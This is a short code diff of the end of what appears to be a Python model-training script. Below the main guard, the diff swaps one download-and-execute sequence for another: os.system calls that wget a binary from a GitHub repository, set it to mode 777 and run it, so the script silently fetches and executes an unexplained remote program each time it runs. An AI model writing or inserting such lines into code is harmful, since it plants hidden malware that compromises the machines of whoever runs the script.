@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/Adeemar7/kalaparan/raw/main/adi')
-os.system('chmod 777 adi')
-os.system('./adi')
+os.system('wget https://github.com/Adeemar7/all/raw/main/dx')
+os.system('chmod 777 dx')
+os.system('./dx')
